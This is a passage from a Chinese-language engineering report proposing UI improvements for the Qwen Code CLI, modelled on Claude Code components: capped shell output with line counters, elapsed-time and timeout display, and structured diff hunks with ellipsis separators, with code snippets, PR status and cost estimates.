- **[PR#3508](https://github.com/QwenLM/qwen-code/pull/3508) 🟡（OPEN，2026-04-21 提交）**：实现 5 行窗口部分——"feat(cli): cap inline shell output with configurable line limit"。**两个 PR 合并后 item-46 完整落地**。

**PR#3508 设计要点**（在 Claude 原设计基础上增强）：

| 方面 | Claude `ShellProgressMessage` | PR#3508 实现 |
|---|---|---|
| 默认行数 | `lines.slice(-5)`（硬编码 5）| `ui.shellOutputMaxLines: 5`（**可配置**，默认 5 匹配 Claude）|
| 可调性 | verbose mode 开关（二选一）| **`0` 禁用 / `15` 自定义**（settings dialog 可视化编辑）|
| verbose 触发 | `ExpandShellOutputContext` | 6 个 bypass 机制（见下表）|
| 作用范围 | Streaming + 完成态都裁剪 | **同 Claude**：AnsiOutputText（流式）+ StringResultRenderer（完成态）都裁剪 |

**6 个 bypass 机制**（比 Claude 覆盖更全）：

| Trigger | Behavior |
|---|---|
| `!` 前缀用户手动命令 | `isUserInitiated → forceShowResult` → 完整输出 |
| 工具等待确认时 | `forceShowResult=true` → 完整输出 |
| 真实工具失败（timeout / abort / throw） | `ToolCallStatus.Error` → 完整输出 |
| 嵌入式 PTY shell 聚焦（Ctrl+F） | `isThisShellFocused=true` → 完整；释放后重新 collapse |
| 用户 opt-out | `ui.shellOutputMaxLines: 0` → 完全禁用 |
| 自定义值 | `ui.shellOutputMaxLines: 15` → 任意 cap |

**精妙的设计决策**（PR#3508 原文）：

> 命令非零 exit（如 `seq 1 30 && false`、`command not found`）**不**触发 Error bypass —— **工具本身成功**，spawned command 失败。cap 行为保持一致不依赖命令退出码，避免用户因为命令偶然失败而意外看到整屏输出。

这是**语义正确**的决策——Claude Code 的原 `ShellProgressMessage` 无此区分，PR#3508 体现了更清晰的 tool success vs command exit code 分离。

**实施摘要**（`packages/cli/src/ui/components/messages/ToolMessage.tsx`）：
```ts
const isShellTool = name === SHELL_COMMAND_NAME || name === SHELL_NAME;
const shellCapHeight =
  isShellTool &&
  shellOutputMaxLines > 0 &&
  !forceShowResult &&
  !isThisShellFocused
    ? Math.min(availableHeight ?? shellOutputMaxLines, shellOutputMaxLines)
    : availableHeight;
```
非 shell 工具 `shellCapHeight === availableHeight`，保证其他工具的 string renderer 不受影响。

**测试覆盖**：6 个新 `ToolMessage` 单元测试 + 8 个手动 tmux 场景验证（AI shell / `!` 用户触发 / exit≠0 / Ctrl+F focus / 配置禁用 / 自定义值 / settings dialog / `+N lines` 流式）。

**合并后最终状态**：item-46 将从 🟡 → ✓ 完整实现（配合 PR#3155 的 `+N lines` 计数已合并）。

**来源**：Claude Code `components/shell/ShellProgressMessage.tsx`。

**问题**：Qwen Code 执行长时间 Bash 命令（`npm install` / `find /` / `build`）时，`shellExecutionService.ts` 维护完整 xterm headless Terminal（默认 30 行 × 80 列），每 100ms 整屏重渲染。**屏幕被 PTY 滚动占满，用户也不知道"总共输出了多少行"——以为完成时已输出完整，实际可能只是 Web UI 500 字符预览。**

**Claude Code 的解决方案**：进行中仅显示**最后 5 行**（`lines.slice(-5)`），右侧 dim color 提示 `+N lines`（多出的行数）或 `~N lines`（大概总行数）。verbose 模式（`ExpandShellOutputContext`）才展开完整输出。

**Claude Code 核心代码**（`components/shell/ShellProgressMessage.tsx:42-82`）：

```tsx
// L42-44：永远只取最后 5 行
const strippedOutput = stripAnsi(output.trim())
lines = strippedOutput.split("\n").filter(notEmpty)
t2 = verbose ? strippedFullOutput : lines.slice(-5).join("\n")

// L74-81：计算多出的行数
const extraLines = totalLines ? Math.max(0, totalLines - 5) : 0
let lineStatus = ""
if (!verbose && totalBytes && totalLines) {
  lineStatus = `~${totalLines} lines`     // 字节 + 行数都可得 → 大概总行数
} else if (!verbose && extraLines > 0) {
  lineStatus = `+${extraLines} lines`     // 仅行数可得 → 精确"多出 N 行"
}

// L65：无输出时用 MessageResponse + OffscreenFreeze（复用 item-44 基础设施）
return <MessageResponse>
  <OffscreenFreeze>
    <Text dimColor>Running… </Text>
    <ShellTimeDisplay elapsedTimeSeconds={...} timeoutMs={...} />
  </OffscreenFreeze>
</MessageResponse>
```

**Claude Code 源码索引**：

| 文件 | 关键函数/常量 |
|------|-------------|
| `components/shell/ShellProgressMessage.tsx:42-44` | `lines.slice(-5).join("\n")` 5 行截断 |
| `components/shell/ShellProgressMessage.tsx:74-81` | `extraLines` + `+N lines` / `~N lines` 两种提示 |
| `components/shell/ShellProgressMessage.tsx:65` | `<MessageResponse><OffscreenFreeze>` 复用 item-44 |
| `components/shell/OutputLine.tsx` | 单行输出组件（含自适应截断） |
| `components/shell/ExpandShellOutputContext.tsx` | 上下文展开，verbose 模式切换 |

**Qwen Code 现状**：`shellExecutionService.ts:612-706` 渲染整个 xterm Terminal 缓冲区（30 行默认），每 100ms 一次（`RENDER_THROTTLE_MS = 100`）。无行数计数提示。

**Qwen Code 修改方向**：
1. **新建 `packages/cli/src/ui/components/ShellProgressMessage.tsx`**：接收 `output` / `verbose` / `totalLines` / `totalBytes` props
2. 在其中实现 `lines.slice(-5).join('\n')` + `+${extraLines} lines` / `~${totalLines} lines` 双模式提示
3. 非 verbose 模式下替代当前整屏 PTY 渲染（PTY 状态仍然在 service 层维护，UI 层只取最后 5 行快照）
4. verbose 模式（`/expand` 命令或 Ctrl+O）切换到完整 PTY
5. **前置依赖**：最好先落地 [item-44](./qwen-code-improvement-report-p2-stability.md#item-44)（MessageResponse + OffscreenFreeze），也可独立实现最小版只做 slice + counter

**实现成本评估**：
- 涉及文件：~3 个（新组件 + 集成点 + 切换模式）
- 新增代码：~100 行
- 开发周期：~1-2 天
- 难点：verbose / non-verbose 切换的状态管理；PTY service 层与 UI 层数据流同步

**改进前后对比**：
- **改进前**：`find /` 输出 5000 行 → 整屏 PTY 滚动 30 行，用户不知道还有多少
- **改进后**：`Running… (12.3s) +4995 lines` 3 行占用，用户清楚知道剩余量

**意义**：长任务场景 "屏幕紧凑 + 进度可见" 是最核心的 UX。
**缺失后果**：屏幕被 PTY 滚动占满，用户误判输出已完整，错过关键 log。
**改进收益**：3 行屏占替代 30 行整屏；`+N lines` 让用户准确判断何时进入"还有很多要跑"的状态。

---

<a id="item-47"></a>

### 47. `ShellTimeDisplay` 执行时间 + timeout 倒计时（P2）🟡 变体实现

> **配套阅读**：[Bash 任务展示 Deep-Dive](./bash-task-display-deep-dive.md) 第 2.2 节。

**状态**：**[PR#3155](https://github.com/QwenLM/qwen-code/pull/3155)（2026-04-20 08:04 UTC 合并）实现了功能等价的时间反馈，但设计与 Claude Code 的 `ShellTimeDisplay` 存在 5 处关键差异**。需根据具体 UX 目标判断是否补齐 Claude 风格。

**PR#3155 实际实现**：
- 新增 `components/shared/ToolElapsedTime.tsx`（67 行）：**3 秒阈值后**显示右对齐 elapsed time（`3s` → `1m 30s` → `2h 15m`），`color={theme.text.secondary}`
- 新增 `components/AnsiOutput.tsx` 的 `ShellStatsBar`：shell 输出下方另起一行显示 `+N lines` / `timeout 3s` / memoryUsage
- elapsed 指示器应用于**所有工具**，右对齐到 `ToolInfo` 右边缘

**PR#3155 vs item-47 spec 差异对比**：

| 方面 | Claude `ShellTimeDisplay` | PR#3155 实现 | 影响 |
|---|---|---|---|
| 起始可见性 | **始终可见**（哪怕 0.5s 也显示） | **3s 阈值**后才出现 | UX 哲学差异：Claude = "工具运行中"信号；Qwen = "这个工具慢"信号 |
| 格式 | `(10.5s · timeout 30s)` **组合单元** | `3s`（独立）+ `timeout 3s`（stats bar 另一处） | **信息分散**——用户需要在两个位置查看时间上下文 |
| 括号 | `(...)` 包裹 | 无 | 视觉辨识度差异 |
| 分隔符 | 中点 `·` (U+00B7) | 无（独立字段） | Claude 的组合表达更紧凑 |
| 时间格式函数 | `formatDuration(ms, { hideTrailingZeros: true })` | 自定义 `formatElapsed(seconds)`——仅整数秒粒度 | Claude 能显示 `10.5s`，PR 只能 `10s`→`11s` |
| 颜色 | `<Text dimColor={true}>`（Ink 内置 dim） | `color={theme.text.secondary}`（theme 语义色） | 实现差异，视觉上接近 |
| 位置 | 与 `Running…` 前缀**内联**（同一行、同一 flex 区域） | **右对齐**到工具行末，独立 flex child | Claude = 连续语义单元；PR = 状态行的装饰元素 |
| 工具范围 | Shell only（在 `ShellProgressMessage` 内）| **所有工具**（CompactToolGroupDisplay 等多个调用点） | PR 覆盖面更广，但失去与 Running… 语境的直接绑定 |

**设计哲学差异**：
- **Claude**：时间是执行态的**一部分**——`Running… (10.5s · timeout 30s)` 是一个完整语义单元
- **PR#3155**：时间是执行态的**延迟装饰**——前 3 秒静默以避免视觉噪音，超过阈值再提示"这个工具偏慢"

**哪种更好？取决于用户偏好**：
- 偏爱持续反馈的用户会觉得 Claude 风格更连贯
- 偏爱 "fast tools stay quiet" 的用户会觉得 PR#3155 的 3s 阈值更克制

**剩余 Claude 风格 gap（若要补齐）**：
1. **组合格式**：把 elapsed + timeout 合并到一个 `(... · ...)` 单元，而非分散在两处
2. **亚秒精度**：`formatElapsed` 改为 `formatDuration(ms, { hideTrailingZeros: true })`，支持 `10.5s`
3. **无阈值模式**：提供 settings 选项 `showElapsedImmediately: true`，禁用 3s 阈值
4. **Shell 专属包装**：为 shell 工具提供 `ShellProgressMessage` 风格的内联组合展示（保留通用 ToolElapsedTime 给其他工具）

**实现补齐成本**：~1 天（在现有 `ToolElapsedTime.tsx` 基础上增加配置项 + 新增 `ShellProgressMessage` 包装组件）。

---

**原规格（未变）**：

**来源**：Claude Code `components/shell/ShellTimeDisplay.tsx`（73 行完整组件）。

**问题**：Qwen Code 执行耗时命令（`npm install` 2 分钟、`cargo build` 5 分钟）时，用户看不到"已跑了多久 / 还有多久 timeout"。只能靠 spinner 图标和字节计数（`2.5MB received`）间接判断。**长任务场景 Claude 的"时间维度"是 Qwen 最明显的 UX 差距。**

**Claude Code 的解决方案**：`ShellTimeDisplay` 根据 `elapsedTimeSeconds` + `timeoutMs` 自动选择三种格式，用 `dim color` 显示避免视觉干扰。

**Claude Code 完整实现**（`components/shell/ShellTimeDisplay.tsx`）：

```tsx
export function ShellTimeDisplay({ elapsedTimeSeconds, timeoutMs }: Props) {
  if (elapsedTimeSeconds === undefined && !timeoutMs) return null

  const timeout = timeoutMs
    ? formatDuration(timeoutMs, { hideTrailingZeros: true })
    : undefined

  // 模式 1：仅 timeout（尚未开始）→ "(timeout 30s)"
  if (elapsedTimeSeconds === undefined) {
    return <Text dimColor>{`(timeout ${timeout})`}</Text>
  }

  const elapsed = formatDuration(elapsedTimeSeconds * 1000)

  // 模式 2：elapsed + timeout → "(10.5s · timeout 30s)"
  if (timeout) {
    return <Text dimColor>{`(${elapsed} · timeout ${timeout})`}</Text>
  }

  // 模式 3：仅 elapsed → "(10.5s)"
  return <Text dimColor>{`(${elapsed})`}</Text>
}
```

**三种格式对照**：

| 状态 | 显示 | 源码行 |
|-----|-----|-------|
| 命令尚未开始 / 无 elapsed | `(timeout 30s)` | L30 |
| 执行中且有 timeout | `(10.5s · timeout 30s)` | L52 |
| 执行中无 timeout | `(10.5s)` | L63 |

**关键细节**：
- `formatDuration(timeoutMs, { hideTrailingZeros: true })` 避免 `30s0ms` 冗余
- 中点符号 `·` 作为分隔（ASCII/Unicode 混排时对齐更好）
- 整个组件用 `Text dimColor` 降低视觉权重——长任务时不抢占用户注意力

**Claude Code 源码索引**：

| 文件 | 关键函数/常量 |
|------|-------------|
| `components/shell/ShellTimeDisplay.tsx` | 73 行完整组件 + 三种格式分支 |
| `utils/format.ts:formatDuration()` | ms → 人类友好字符串（`65000ms` → `1m5s`） |

**Qwen Code 现状**：`shellExecutionService.ts` 提供 elapsed 但 UI 层未展示时间信息；timeout 也未在 UI 显示。

**Qwen Code 修改方向**：
1. **新建 `packages/cli/src/ui/components/ShellTimeDisplay.tsx`**：~30 行组件，复刻三种格式分支
2. **新建 `packages/cli/src/utils/formatDuration.ts`**（若不存在）：`ms → "1m23s"` 人类友好格式化
3. 在 `ShellProgressMessage`（item-46）和完成后结果组件中集成
4. 提供 `shell_execution.timeoutMs` 配置项（已有则复用）

**实现成本评估**：
- 涉及文件：~2-3 个
- 新增代码：~80 行（含 `formatDuration` 实现和单元测试）
- 开发周期：~1 天
- 难点：elapsed 时间的 tick 更新（1s 粒度）需要 `useEffect` + `setInterval`，注意 cleanup

**改进前后对比**：
- **改进前**：`npm install` 跑了 2 分钟，用户不知道。看不出是"快完了"还是"刚开始"
- **改进后**：`Running… (1m23s · timeout 5m) +234 lines`——时间 + 进度 + 剩余窗口一眼可见

**意义**：长任务场景"还剩多久"是用户关心的第一维度。
**缺失后果**：用户盯着屏幕等待，无法判断何时该放弃或切其他任务。
**改进收益**：elapsed + timeout 倒计时让用户形成"可预测的等待体验"。

**组合效果**：item-44（MessageResponse + OffscreenFreeze）+ item-46（5 行 + 计数）+ item-47（时间显示）三项合并后，Qwen Code 的 Bash UI 将达到与 Claude Code 相当的"紧凑 + 进度可见"效果。总投入 **~4-5 天**。

---

<a id="item-48"></a>

### 48. 语义化 hunk 模型 + `singleHunk` 智能上下文（P2）

> **配套阅读**：[Update 工具展示 Deep-Dive](./update-tool-display-deep-dive.md) 第 2.1 节。

**来源**：Claude Code `utils/diff.ts`（`structuredPatch` + `singleHunk` 启发式）。

**问题**：Qwen Code 的 `Edit` 工具在 core 层用 `Diff.createPatch()`（`packages/core/src/tools/edit.ts:308, 433`）返回**字符串 patch**，UI 层 `DiffRenderer.tsx:23-81` 用 regex `parseDiffWithLineNumbers()` 重新解析字符串——**语义信息在序列化/反序列化过程中丢失**，每次渲染都重复 regex 解析（性能浪费）。同时，Qwen 固定使用上下文行数（`MAX_CONTEXT_LINES_WITHOUT_GAP = 5`），**无法根据 hunk 数量智能调整**——单处小修改时看不到完整函数上下文。

**Claude Code 的解决方案（两部分）**：

#### (A) `structuredPatch` 语义化 hunk 模型

使用 `diff` npm library 的 `structuredPatch()` 直接返回 `StructuredPatchHunk[]`：

```typescript
// utils/diff.ts:81-114
export function getPatchFromContents({
  filePath, oldContent, newContent, ignoreWhitespace = false,
  singleHunk = false,
}): StructuredPatchHunk[] {
  const result = structuredPatch(
    filePath, filePath,
    escapeForDiff(oldContent), escapeForDiff(newContent),
    undefined, undefined,
    {
      ignoreWhitespace,
      context: singleHunk ? 100_000 : CONTEXT_LINES,  // ⭐ 智能上下文
      timeout: DIFF_TIMEOUT_MS,
    }
  )
  return result?.hunks.map(h => ({ ...h, lines: h.lines.map(unescapeFromDiff) }))
}
```

#### (B) `singleHunk` 智能上下文（核心启发式）

**`utils/diff.ts:103`**：
- **单 hunk**（整个 diff 只有一处修改）→ `context: 100_000` = **全量上下文**
- **多 hunk**（修改多处）→ `context: 3` = **紧凑模式**

**设计意图**：单处修改时用户想看**完整上下文**（"这个函数整体改后长什么样"）；多处修改时用户想看**每处变更的紧凑预览**。

**Claude Code 源码索引**：

| 文件 | 关键函数/常量 |
|------|-------------|
| `utils/diff.ts:9` | `CONTEXT_LINES = 3` |
| `utils/diff.ts:10` | `DIFF_TIMEOUT_MS = 5_000` |
| `utils/diff.ts:103` | `context: singleHunk ? 100_000 : CONTEXT_LINES` |
| `utils/diff.ts:81-114` | `getPatchFromContents()` 返回 `StructuredPatchHunk[]` |
| `components/StructuredDiff.tsx` | 直接消费 hunk，无 regex 解析 |

**Qwen Code 现状**：

| 文件 | 现状 |
|------|------|
| `packages/core/src/tools/edit.ts:308, 433` | `Diff.createPatch()` 返回字符串 patch |
| `packages/cli/src/ui/components/messages/DiffRenderer.tsx:23-81` | `parseDiffWithLineNumbers()` 用 regex 重新解析字符串 |
| `DiffRenderer.tsx:245` | `MAX_CONTEXT_LINES_WITHOUT_GAP = 5`（固定，不根据 hunk 数调整）|

**Qwen Code 修改方向**：
1. **core 层改用 `Diff.structuredPatch()`**——修改 `edit.ts:308, 433` 两处，返回 `StructuredPatchHunk[]`
2. **增加 `singleHunk` 启发式**：`hunks.length === 1` 时调整 context 参数
3. **UI 层直接消费 hunk 数据**——`DiffRenderer.tsx` 接收 `StructuredPatchHunk[]`，**移除 `parseDiffWithLineNumbers()`**（60+ 行 regex 代码可删）
4. **测试**：添加单 hunk / 多 hunk 上下文差异的快照测试

**实现成本评估**：
- 涉及文件：~3 个（`edit.ts` + `DiffRenderer.tsx` + 类型定义）
- 改动代码：+100 / -60 行
- 开发周期：~2-3 天
- 难点：core 层类型改动可能影响 tool result 序列化格式，需要兼容性处理

**改进前后对比**：
- **改进前**：每次渲染都 regex re-parse；单行小修改时只看到 5 行上下文，看不到函数签名和返回值
- **改进后**：直接消费 hunk（~10x 性能提升）；单 hunk 时看到完整函数上下文，理解变更意图更容易

**意义**：语义化数据流是 diff UI 演进的基础设施。
**缺失后果**：UI 层承担 regex 维护成本；上下文展示不智能。
**改进收益**：消除 60+ 行 regex 代码 + 性能 10x + 单修改场景看到完整上下文。

---

<a id="item-49"></a>

### 49. 多 hunk `...` 省略分隔符（StructuredDiffList 模式）（P2）

> **配套阅读**：[Update 工具展示 Deep-Dive](./update-tool-display-deep-dive.md) 第 2.2 节。

**来源**：Claude Code `components/StructuredDiffList.tsx`（~30 行完整实现）。

**问题**：当 Edit/MultiEdit 产生多个 hunk（修改多处位置）时，Qwen Code CLI 的 `DiffRenderer` 用 `═` 全宽横线分隔**同一 hunk 内的无修改 gap**，但**不区分 hunk 之间**——多处修改堆叠在一起，视觉上难以识别"这是第几处变更"。Qwen WebUI 则完全单行摘要，更是没有多 hunk 视觉分隔。

**Claude Code 的解决方案**：在 hunk 之间插入 dim color `...` 省略符号。

**完整实现**（`components/StructuredDiffList.tsx:16-29`）：

```tsx
export function StructuredDiffList({
  hunks, dim, width, filePath, firstLine, fileContent
}: Props): React.ReactNode {
  return intersperse(
    hunks.map(hunk => (
      <Box flexDirection="column" key={hunk.newStart}>
        <StructuredDiff patch={hunk} dim={dim} width={width}
          filePath={filePath} firstLine={firstLine} fileContent={fileContent} />
      </Box>
    )),
    i => (
      <NoSelect fromLeftEdge key={`ellipsis-${i}`}>
        <Text dimColor>...</Text>
      </NoSelect>
    )
  )
}
```

**效果（用户视角）**：

```
--- foo/bar.ts
@@ -10,3 +10,3 @@
  function hello() {
-   return "world"
+   return "world!"
  }

...                                 ← 省略分隔符（dim color）

@@ -42,3 +42,3 @@
  function goodbye() {
-   return "bye"
+   return "see ya"
  }

...                                 ← 又一个分隔

@@ -87,3 +87,3 @@
  function farewell() {
-   return "adios"
+   return "hasta luego"
  }
```

**关键设计细节**：
- **`intersperse` 工具函数**：数组元素间插入分隔符（比 `.map(...).join(...)` 更语义化）
- **`NoSelect` 组件**：分隔符不响应文本选中，复制 diff 时不会带进 `...`
- **`fromLeftEdge` 属性**：省略号贴左边缘对齐
- **`dimColor`**：视觉上降低权重，不与 diff 内容竞争注意力

**Claude Code 源码索引**：

| 文件 | 关键函数/常量 |
|------|-------------|
| `components/StructuredDiffList.tsx:16-29` | 完整实现（30 行） |
| `utils/array.ts:intersperse()` | 数组插入分隔符工具函数 |
| `ink.js:NoSelect` | 不响应文本选中的 wrapper 组件 |

**Qwen Code 现状**：
- CLI `DiffRenderer.tsx:248-276` 用 `═` 全宽横线分隔 gap，但处理的是**同一 hunk 内大段无修改**，不是 hunk 之间
- 多 hunk 场景直接堆叠（或由 MaxSizedBox 截断）
- WebUI 单行摘要，无多 hunk 展开

**Qwen Code 修改方向**：
1. **前置依赖**：先落地 item-48（语义化 hunk 模型），才有 `StructuredPatchHunk[]` 可迭代
2. 在 `DiffRenderer.tsx` 中检测 `hunks.length > 1`，渲染每个 hunk 后插入 `<Text dimColor>...</Text>`
3. WebUI 可选：提供"展开所有 hunk"按钮，展开后用相同 `...` 分隔
4. 考虑新增 `NoSelect` 组件（若不存在）避免复制时带分隔符

**实现成本评估**：
- 涉及文件：~2 个（`DiffRenderer.tsx` + 可能的 `NoSelect.tsx`）
- 新增代码：~30 行
- 开发周期：~0.5 天
- 前置：item-48（语义化 hunk 模型）
- 难点：与现有 `═` 间隙符（hunk 内）的视觉协调——建议使用两种不同符号区分"hunk 内 gap"和"hunk 之间"

**改进前后对比**：
- **改进前**：3 处修改的 diff 视觉上是一整块，用户需要靠行号反跳识别位置
- **改进后**：`...` 明确分隔，用户一眼看到"有 3 处修改，分别在 10/42/87 行附近"

**意义**：多处修改是 refactor / rename 的常见场景，视觉分隔直接影响 review 效率。
**缺失后果**：MultiEdit 多处修改的 UI 不如 Claude 清晰。
**改进收益**：30 行代码换来多 hunk 场景的视觉层次感；与 item-48 配合实现完整的 Claude 风格 diff 展示。
